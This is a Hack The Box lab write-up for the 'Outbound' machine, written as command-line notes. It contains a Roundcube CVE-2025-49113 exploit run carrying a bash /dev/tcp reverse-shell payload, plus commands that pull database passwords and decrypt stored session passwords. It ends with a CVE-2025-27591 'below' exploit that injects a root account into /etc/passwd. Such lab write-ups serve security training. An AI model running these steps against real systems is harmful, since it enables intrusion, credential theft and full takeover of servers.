- - - 
created : 25-08-2025 

Tags : #easy 

Released on 12 Jul 2025 (Season 8)
- - - 
# Machine Info

As is common in real life pentests, you will start the Outbound box with credentials for the following account: 

`tyler / LhKL1o9Nm3X2`
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Outbound]
└─$ rustscan -a outbound.htb -- -A 

Open 10.10.11.77:22
Open 10.10.11.77:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

We have another hostname let's add it to the /etc/hosts file:

```
10.10.11.77 outbound.htb mail.outbound.htb
```
# Enumeration
## HTTP (80)

We can visit the site on http://outbound.htb :

![Pasted image 20250825155312.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250825155312.png)

Now we can see there's some [Cross-site Scripting (XSS)](../../../3%20-%20Tags/Hacking%20Concepts/Cross-site%20Scripting%20(XSS).md), this is basically a hint, we log in with the given credentials:

![Pasted image 20250825162534.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250825162534.png)
# Exploit

We find the [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) code and desc on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md):

![Pasted image 20250825162632.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250825162632.png)

We clone the repo.
## How it Works

1. The script first checks if the target is running a vulnerable version of Roundcube
2. If vulnerable, it proceeds with the authentication process
3. After successful authentication, it sends a generic PNG image to the server
4. During the upload, the exploit performs two injections:
    - PHP session injection through the "_form" parameter in the query string
    - Malicious object (gadget) injection through the "filename" parameter of "_file"
5. The combination of these injections allows for remote code execution on the server
## Reverse Shell with RCE

We can straight use it, first we make it executable:

```bash
chmod +x CVE-2025-49113.php                                                                             
```

We open a [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener on the given port:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Outbound/FirstAccess/CVE-2025-49113-exploit]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

Then run the exploit file with this command:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Outbound/FirstAccess/CVE-2025-49113-exploit]
└─$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "bash -c 'exec bash -i &>/dev/tcp/10.10.14.73/1337 <&1'"
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...

```

You can craft the [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) with [Hack-Tools](../../../3%20-%20Tags/Hacking%20Tools/Hack-Tools.md) or similar., we return to [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and `su tyler`:

```
www-data@mail:/$ su tyler
su tyler
Password: LhKL1o9Nm3X2
```

We can't perform [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) with [Python](../../../3%20-%20Tags/Programming%20Languages/Python.md) to work better.
# Privilege Escalation
## Tyler to Jacob 

Starting [Privilege Escalation](../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) we can find a config file with a password:

```bash
cat /var/www/html/roundcube/config/config.inc.php 
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

We can use [MySQL](../../../3%20-%20Tags/Hacking%20Tools/MySQL.md) to access and read the databases:

```bash
mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from users;' -E
*************************** 1. row ***************************
             user_id: 1
            username: jacob
           mail_host: localhost
             created: 2025-06-07 13:55:18
          last_login: 2025-06-11 07:52:49
        failed_login: 2025-08-25 15:06:48
failed_login_counter: 1
            language: en_US
         preferences: a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
*************************** 2. row ***************************
             user_id: 2
            username: mel
           mail_host: localhost
             created: 2025-06-08 12:04:51
          last_login: 2025-06-08 13:29:05
        failed_login: 2025-08-25 15:07:02
failed_login_counter: 2
            language: en_US
         preferences: a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
*************************** 3. row ***************************
             user_id: 3
            username: tyler
           mail_host: localhost
             created: 2025-06-08 13:28:55
          last_login: 2025-08-25 15:06:28
        failed_login: 2025-06-11 07:51:22
failed_login_counter: 1
            language: en_US
         preferences: a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";}
```

We have strange hashes here.. we can check `session` too:

```bash
mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from session;' -E

*************************** 1. row ***************************
sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
changed: 2025-06-08 15:46:40
     ip: 172.17.0.1
   vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
```

There's `jacob` login data in mail, we can decode them, it's [Base64](../../../3%20-%20Tags/Hacking%20Concepts/Base64.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Outbound/FirstAccess/CVE-2025-49113-exploit]
└─$ base64 -d jacob.txt              
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";                  
```

password: **L7Rv00A8TuwJAr67kITxxcSgnIk25Am/**
auth_secret: **DpYqv6maI9HxDL5GhcCd8JaQQW**
request_token: **TIsOaABA1zHSXZOBpH6up5XFyayNRHaw**
timezone: Europe/London

We need to understand what type of encryption is that, we find out that Roundcube uses **Triple DES**.
## CyberChef

We'll use [CyberChef](../../../3%20-%20Tags/Hacking%20Tools/CyberChef.md) to [Decipher](../../../3%20-%20Tags/Hacking%20Concepts/Decipher.md) the password:

1. Base64 
2.  Hexadecimal

![Pasted image 20250825175030.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250825175030.png)

3. First 8 bit of HEX use as IV, others as text, key is `des_key` in config.inc.php file: 

![Pasted image 20250825175422.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250825175422.png)

We are now able to access `jacob`'s mail:

![Pasted image 20250825175559.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250825175559.png)
## SSH (22)

We can log in on [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) now with the found password: gY4Wr3a1evp4

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Outbound/FirstAccess/CVE-2025-49113-exploit/images]
└─$ ssh jacob@outbound.htb
jacob@outbound.htb password:
 
jacob@outbound:~$ cat user.txt 
  HTB{{REDACTED_FLAG}}
```
## Jacob to Root

We can check sudo privileges:

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*,
        !/usr/bin/below -d*

 
jacob@outbound:~$ below -h
Usage: below [OPTIONS] [COMMAND]

Commands:
  live      Display live system data (interactive) (default)
  record    Record local system data (daemon mode)
  replay    Replay historical data (interactive)
  debug     Debugging facilities (for development use)
  dump      Dump historical data into parseable text format
  snapshot  Create a historical snapshot file for a given time range
  help      Print this message or the help of the given subcommand(s)

Options:
      --config <CONFIG>  [default: /etc/below/below.conf]
  -d, --debug            
  -h, --help             Print help
```
## Exploit

We find the [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md):

![Pasted image 20250825182914.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250825182914.png)

We clone the repo and `cd` into that: 

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Outbound/Root]
└─$ git clone https://github.com/obamalaolu/CVE-2025-27591.git         

└─$ cd CVE-2025-27591 
```

Then we transfer the script with [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Outbound/Root/CVE-2025-27591]
└─$ scp CVE-2025-27591.sh jacob@outbound.htb:/tmp/ 

jacob@outbound.htb's password: 
CVE-2025-27591.sh                                                                           100% 1331     4.2KB/s   00:00    
```

**Modify line** :

```bash
# Prepare malicious passwd line
echo "[*] Creating malicious passwd line..."
echo "haxor:$HASH:0:0:,,,:/root:/bin/bash" > "$TMP_PAYLOAD"
```

Run it with `bash`:

```bash
jacob@outbound:/tmp$ bash CVE-2025-27591.sh 
[*] CVE-2025-27591 Privilege Escalation Exploit
[*] Checking sudo permissions...
[*] Backing up /etc/passwd to /tmp/passwd.bak
[*] Generating password hash...
[*] Creating malicious passwd line...
[*] Linking /var/log/below/error_root.log to /etc/passwd
[*] Triggering 'below' to write to symlinked log...
[*] Injecting malicious user into /etc/passwd
[*] Try switching to 'haxor' using password: hacked
Password: 
haxor@outbound:/tmp# cd /root
haxor@outbound:~# ls
root.txt
haxor@outbound:~# cat root.txt
  HTB{{REDACTED_FLAG}}
```

Pwned !!